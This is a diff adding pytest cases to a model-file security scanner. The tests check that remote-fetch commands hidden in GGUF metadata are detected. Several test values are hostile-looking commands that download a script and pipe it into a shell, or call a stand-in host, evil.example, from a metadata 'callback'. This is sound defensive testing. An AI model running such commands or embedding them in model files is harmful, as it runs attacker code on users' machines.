@@ -2,6 +2,7 @@
 
 import json
 import struct
+import sys
 import time
 import zipfile
 from pathlib import Path
@@ -17,6 +18,7 @@ from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.rules import Severity
 from modelaudit.scanners.base import DEFAULT_MAX_FILE_READ_SIZE, INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.gguf_scanner import (
+    _GGUF_REMOTE_URL_POSITION_LIMIT,
     GGUF_DUPLICATE_METADATA_INCONCLUSIVE_REASON,
     GGUF_METADATA_LIMIT_INCONCLUSIVE_REASON,
     GGUF_PARSE_INCONCLUSIVE_REASON,
@@ -1569,6 +1571,19 @@ def test_gguf_metadata_remote_fetch_detects_alias_after_many_benign_aliases(tmp_
     assert all(check.rule_code == "S902" for check in checks)
 
 
+def test_gguf_metadata_remote_fetch_detects_alias_after_truncated_alias_window(tmp_path: Path) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
+    value = f"{benign_aliases}\nimport requests as target_client\ntarget_client.delete('https://evil.example/payload')"
+    path = create_mock_gguf(tmp_path / "truncated-client-aliases.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
 def test_gguf_metadata_remote_fetch_detects_later_alias_after_benign_omitted_alias(tmp_path: Path) -> None:
     benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
     value = (
@@ -1618,6 +1633,26 @@ def test_gguf_metadata_remote_fetch_alias_cap_non_network_calls_stay_clean(value
     assert evidence == []
 
 
+def test_gguf_metadata_remote_fetch_truncated_alias_non_network_calls_stay_clean() -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
+    value = f"{benign_aliases}\nmodel.delete('https://evil.example/not-a-fetch')"
+
+    evidence = GgufScanner._metadata_value_security_evidence("callback", value)
+
+    assert evidence == []
+
+
+def test_gguf_metadata_remote_fetch_truncated_alias_wrong_method_stays_clean() -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
+    value = (
+        f"{benign_aliases}\nimport urllib.request as url_client\nurl_client.delete('https://evil.example/not-a-fetch')"
+    )
+
+    evidence = GgufScanner._metadata_value_security_evidence("callback", value)
+
+    assert evidence == []
+
+
 def test_gguf_metadata_fetch_command_words_in_prose_are_not_remote_fetch() -> None:
     value = "curl examples are documented at https://huggingface.co/docs/hub/security"
 
@@ -1648,6 +1683,29 @@ def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
     evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
 
     assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "curl https://huggingface.co/org/model/resolve/main/payload.sh | xargs sh",
+        "curl https://huggingface.co/org/model/resolve/main/payload.sh | tee /tmp/payload.sh; sh /tmp/payload.sh",
+        'requests.delete("https://huggingface.co/org/model/resolve/main/payload.sh")',
+        'fetch("https://huggingface.co/org/model/resolve/main/payload.sh")',
+    ],
+)
+def test_gguf_metadata_documentation_hf_remote_fetch_chains_still_detected(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert any(item["evidence_type"] == "remote_fetch" for item in evidence)
+
+
+def test_gguf_metadata_remote_url_position_index_is_bounded() -> None:
+    value = " ".join(f"https://huggingface.co/org/model/{index}" for index in range(2_000))
+
+    positions = GgufScanner._remote_url_positions(value)
+
+    assert len(positions) == _GGUF_REMOTE_URL_POSITION_LIMIT
 
 
 @pytest.mark.parametrize(
@@ -1709,18 +1767,19 @@ def test_gguf_metadata_value_security_evidence_handles_adversarial_punctuation_q
     benign_urls = " ".join(["https://huggingface.co/org/model"] * 20_000)
     repeated_api_tokens = "https://huggingface.co/org/model " + "fetch(nope) " * 20_000
 
-    start = time.perf_counter()
+    start = time.process_time()
     malicious_evidence = GgufScanner._metadata_value_security_evidence("download", malicious)
     benign_evidence = GgufScanner._metadata_value_security_evidence("description", benign)
     benign_url_evidence = GgufScanner._metadata_value_security_evidence("description", benign_urls)
     repeated_api_evidence = GgufScanner._metadata_value_security_evidence("description", repeated_api_tokens)
-    elapsed = time.perf_counter() - start
+    elapsed = time.process_time() - start
 
     assert any(evidence["evidence_type"] == "remote_fetch" for evidence in malicious_evidence)
     assert benign_evidence == []
     assert benign_url_evidence == []
     assert repeated_api_evidence == []
-    assert elapsed < 1.0
+    elapsed_budget = 1.5 if sys.platform == "win32" else 1.0
+    assert elapsed < elapsed_budget
 
 
 def test_gguf_metadata_concrete_evidence_end_to_end_regressions(tmp_path: Path) -> None:
